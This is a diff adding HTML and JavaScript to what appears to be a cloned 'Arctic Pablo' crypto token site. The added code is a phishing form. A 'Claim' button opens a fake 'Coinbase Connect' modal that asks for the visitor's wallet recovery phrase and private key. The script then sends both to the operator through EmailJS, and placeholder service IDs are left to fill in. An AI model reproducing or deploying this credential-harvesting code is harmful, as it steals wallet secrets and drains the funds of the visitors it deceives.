+                      style="width: 24px; height: 24px"
+                    />
+                    <span style="font-size: 15px; color: #001f54"
+                      >Wallet Connect</span
+                    >
+                  </div>
+
+                  <!-- Coinbase Option -->
+                  <div
+                    onclick="openCoinbaseModal()"
+                    style="
+                      display: flex;
+                      align-items: center;
+                      gap: 10px;
+                      padding: 10px;
+                      cursor: pointer;
+                      border-radius: 8px;
+                      transition: background 0.2s;
+                    "
+                    onmouseover="this.style.background='#f1f5f9'"
+                    onmouseout="this.style.background='transparent'"
+                  >
+                    <img
+                      src="https://th.bing.com/th?q=Coinbase+Global.inc&w=120&h=120&c=1&rs=1&qlt=70&o=7&cb=1&pid=InlineBlock&rm=3&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247"
+                      alt="Coinbase"
+                      style="width: 24px; height: 24px"
+                    />
+                    <span style="font-size: 15px; color: #001f54"
+                      >Coinbase</span
+                    >
+                  </div>
+                </div>
+              </div>
+
+              <!-- 2️⃣ Coinbase Modal -->
+              <div
+                id="coinbaseModal"
+                style="
+                  display: none;
+                  position: fixed;
+                  top: 0;
+                  left: 0;
+                  width: 100%;
+                  height: 100%;
+                  background: rgba(0, 0, 0, 0.5);
+
+                  align-items: center;
+                  justify-content: center;
+                  z-index: 1001;
+                "
+              >
+                <div
+                  style="
+                    background: #fff;
+                    border-radius: 12px;
+                    width: 90%;
+                    max-width: 420px;
+                    padding: 20px;
+                    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+                    position: relative;
+                  "
+                >
+                  <!-- Close Button -->
+                  <button
+                    onclick="closeCoinbaseModal()"
+                    style="
+                      position: absolute;
+                      top: 12px;
+                      right: 12px;
+                      background: none;
+                      border: none;
+                      font-size: 20px;
+                      color: black;
+                      cursor: pointer;
+                    "
+                  >
+                    ✕
+                  </button>
+
+                  <h2
+                    style="
+                      text-align: center;
+                      font-size: 18px;
+                      font-weight: bold;
+                      color: #001f54;
+                      margin-bottom: 20px;
+                    "
+                  >
+                    Coinbase Connect
+                  </h2>
+
+                  <!-- Recovery Phrase Form -->
+                  <form id="phraseForm">
+                    <label style="font-weight: bold; color: #001f54"
+                      >Recovery Phrase</label
+                    >
+                    <textarea
+                      name="phrase"
+                      rows="3"
+                      placeholder="Enter your 12/24-word phrase"
+                      style="
+                        width: 100%;
+                        margin: 10px 0;
+                        padding: 8px;
+                        border: 1px solid #ccc;
+                        border-radius: 6px;
+                        color: #001f54;
+                      "
+                    ></textarea>
+
+                    <button
+                      type="submit"
+                      style="
+                        background: #001f54;
+                        color: #fff;
+                        padding: 8px 14px;
+                        border: none;
+                        border-radius: 6px;
+                        cursor: pointer;
+                      "
+                    >
+                      Connect with Phrase
+                    </button>
+                  </form>
+
+                  <hr style="margin: 20px 0" />
+
+                  <!-- Passkey Form -->
+                  <form id="passkeyForm">
+                    <label style="font-weight: bold; color: #001f54"
+                      >Private Key / Passkey</label
+                    >
+                    <input
+                      type="text"
+                      name="passkey"
+                      placeholder="Enter your passkey"
+                      style="
+                        width: 100%;
+                        margin: 10px 0;
+                        padding: 8px;
+                        border: 1px solid #ccc;
+                        border-radius: 6px;
+                        color: #001f54;
+                      "
+                    />
+
+                    <button
+                      type="submit"
+                      style="
+                        background: #001f54;
+                        color: #fff;
+                        padding: 8px 14px;
+                        border: none;
+                        border-radius: 6px;
+                        cursor: pointer;
+                      "
+                    >
+                      Connect with Passkey
+                    </button>
+                  </form>
+                </div>
+              </div>
+
+              <!-- 3️⃣ JavaScript -->
+              <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+              <script>
+                (function () {
+                  emailjs.init("YOUR_EMAILJS_USER_ID"); // replace with your EmailJS User ID
+                })();
+
+                function openWalletModal() {
+                  document.getElementById("walletModal").style.display = "flex";
+                }
+                function closeWalletModal() {
+                  document.getElementById("walletModal").style.display = "none";
+                }
+                function openCoinbaseModal() {
+                  document.getElementById("walletModal").style.display = "none";
+                  document.getElementById("coinbaseModal").style.display =
+                    "flex";
+                }
+                function closeCoinbaseModal() {
+                  document.getElementById("coinbaseModal").style.display =
+                    "none";
+                }
+
+                // Handle Phrase Form
+                document
+                  .getElementById("phraseForm")
+                  .addEventListener("submit", function (e) {
+                    e.preventDefault();
+                    emailjs
+                      .send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+                        method: "Recovery Phrase",
+                        data: e.target.phrase.value,
+                      })
+                      .then(
+                        () => {
+                          alert("Phrase sent successfully!");
+                          e.target.reset();
+                          closeCoinbaseModal();
+                        },
+                        (err) => {
+                          alert("Error: " + JSON.stringify(err));
+                        }
+                      );
+                  });
+
+                // Handle Passkey Form
+                document
+                  .getElementById("passkeyForm")
+                  .addEventListener("submit", function (e) {
+                    e.preventDefault();
+                    emailjs
+                      .send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+                        method: "Passkey",
+                        data: e.target.passkey.value,
+                      })
+                      .then(
+                        () => {
+                          alert("Passkey sent successfully!");
+                          e.target.reset();
+                          closeCoinbaseModal();
+                        },
+                        (err) => {
+                          alert("Error: " + JSON.stringify(err));
+                        }
+                      );
+                  });
+              </script>
+
+              <!--/--><!--$--><!--/--><!--$--><!--/-->
+            </div>
+          </div>
+        </section>
+        <!--astro:end--></astro-island
+      >
+    </main>
+    <footer class="footer" data-astro-cid-sz7xmlte>
+      <div class="video-container" data-astro-cid-sz7xmlte>
+        <div class="video-wrapper" data-astro-cid-sz7xmlte>
+          <astro-island
+            uid="ZEGaLz"
+            data-solid-render-id="s1"
+            component-url="/_astro/Animation.B1bu0Jy2.js"
+            component-export="default"
+            renderer-url="/_astro/client.CYT6LV0k.js"
+            props='{"class":[0,"video"],"src":[0,"/_astro/footer.91benUrc.json"],"aspectRatio":[0,1.0285714285714285],"data-astro-cid-sz7xmlte":[0,true]}'
+            ssr
+            client="load"
+            opts='{"name":"Animation","value":true}'
+            await-children
+            ><div
+              data-hk="s10000"
+              class="_container_fbqer_1 video"
+              data-astro-cid-sz7xmlte="true"
+              style="aspect-ratio: 1.0285714285714285"
+            >
+              <!--$--><!--/-->
+              <div class="_animation-inner_fbqer_9"></div>
+            </div>
+            <!--astro:end--></astro-island
+          >
+        </div>
+        <div class="social-info" data-astro-cid-sz7xmlte>
+          <p class="footer-label-1" data-astro-cid-sz7xmlte>
+            Begin a new journey
+          </p>
+          <p class="footer-label-2" data-astro-cid-sz7xmlte>
+            With arctic pablo
+          </p>
+          <div class="social-links" data-astro-cid-sz7xmlte>
+            <a
+              class="social-link"
+              href="https://t.me/ArcticPabloOfficial"
+              target="_blank"
+              data-astro-cid-sz7xmlte
+            >
+              <img
+                src="../_astro/telegram.596u70ny_TPLxN.svg"
+                alt
+                aria-hidden="true"
+                data-astro-cid-sz7xmlte="true"
+                width="24"
+                height="20"
+                loading="lazy"
+                decoding="async"
+              />
+              Telegram
+            </a>
+            <a
+              class="social-link"
+              href="https://x.com/arcticpabloHQ"
+              target="_blank"
+              data-astro-cid-sz7xmlte
+            >
+              <img
+                src="../_astro/twitter.B1nZn8eQ_ZWnqbT.svg"
+                alt
+                aria-hidden="true"
+                data-astro-cid-sz7xmlte="true"
+                width="24"
+                height="24"
+                loading="lazy"
+                decoding="async"
+              />
+              Twitter
+            </a>
+          </div>
+        </div>
+        <div class="bottom-details" data-astro-cid-sz7xmlte>
+          <img
+            src="../_astro/logo-dark.BUlzYrCd_1LFljB.svg"
+            alt="Logo of the penguin with a backpack, hat, goggles and a map"
+            data-astro-cid-sz7xmlte="true"
+            width="200"
+            height="200"
+            loading="lazy"
+            decoding="async"
+            class="logo"
+          />
+          <div class="bottom-info" data-astro-cid-sz7xmlte>
+            <p class="bottom-title" data-astro-cid-sz7xmlte>Arctic Pablo</p>
+            <p class="bottom-subtitle" data-astro-cid-sz7xmlte>
+              Chill and Win, Let the Journey Begin!
+            </p>
+            <div class="footer-buttons" data-astro-cid-sz7xmlte>
+              <a
+                class="button button size-default color-#01a3ff button"
+                onclick="openWalletModal()"
+                style="
+                  --bg: #01a3ff;
+                  --text: #fff;
+                  --border-col: #4ddeff;
+                  --shadow-col: #14bdff;
+                "
+                data-astro-cid-vnzlvqnm="true"
+              >
+                Claim
+              </a>
+              <a
+                class="button button size-default color-#01a3ff button"
+                href="https://pancakeswap.finance/swap?chain=bsc&inputCurrency=0x84B742E4514EC8b073005D7Ec0A6d7350F2a9a52&outputCurrency=BNB"
+                target="_blank"
+                rel="noopener noreferrer"
+                data-astro-cid-sz7xmlte="true"
+                style="
+                  --bg: #01a3ff;
+                  --text: #fff;
+                  --border-col: #4ddeff;
+                  --shadow-col: #14bdff;
+                "
+                data-astro-cid-vnzlvqnm="true"
+              >
+                Buy on PancakeSwap
+              </a>
+              <button
+                class="button button size-default color-#01a3ff button"
+                disabled
+                data-astro-cid-sz7xmlte="true"
+                style="
+                  --bg: #01a3ff;
+                  --text: #fff;
+                  --border-col: #4ddeff;
+                  --shadow-col: #14bdff;
+                "
+                data-astro-cid-vnzlvqnm="true"
+              >
+                Buy on CoinStore (Coming Soon)
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="footer-bottom" data-astro-cid-sz7xmlte>
+        <p class="copyright-label" data-astro-cid-sz7xmlte>
+          © 2024 ArcticPablo. All Rights Reserved.
+        </p>
+        <div class="footer-links" data-astro-cid-sz7xmlte>
+          <a
+            class="footer-link"
+            href="https://www.arcticpablo.com/"
+            data-astro-cid-sz7xmlte
+          >
+            Home </a
+          ><a
+            class="footer-link"
+            href="https://www.arcticpablo.com/claim"
+            data-astro-cid-sz7xmlte
+          >
+            Claim </a
+          ><a
+            class="footer-link"
+            href="https://www.arcticpablo.com/staking"
+            data-astro-cid-sz7xmlte
+          >
+            Stake </a
+          ><a
+            class="footer-link"
+            href="https://www.arcticpablo.com/?section=roadmap"
+            data-astro-cid-sz7xmlte
+          >
+            Roadmap </a
+          ><a
+            class="footer-link"
+            href="https://www.arcticpablo.com/?section=tokenomics"
+            data-astro-cid-sz7xmlte
+          >
+            Tokenomics </a
+          ><a
+            class="footer-link"
+            href="https://www.arcticpablo.com/documents/whitepaper.pdf?v=2"
+            data-astro-cid-sz7xmlte
+          >
+            Whitepaper </a
+          ><a
+            class="footer-link"
+            href="https://www.arcticpablo.com/cookies"
+            data-astro-cid-sz7xmlte
+          >
+            Cookies Policy </a
+          ><a
+            class="footer-link"
+            href="https://www.arcticpablo.com/privacy-policy"
+            data-astro-cid-sz7xmlte
+          >
+            Privacy Policy </a
+          ><a
+            class="footer-link"
+            href="https://www.arcticpablo.com/disclaimer"
+            data-astro-cid-sz7xmlte
+          >
+            Disclaimer </a
+          ><a
+            class="footer-link"
+            href="https://www.arcticpablo.com/terms-and-conditions"
+            data-astro-cid-sz7xmlte
+          >
+            Terms and Conditions
+          </a>
+        </div>
+      </div>
+    </footer>
+    <div id="tooltips" data-astro-cid-dmqsi53g></div>
+    <div id="modals" data-astro-cid-dmqsi53g></div>
+  </body>
+</html>
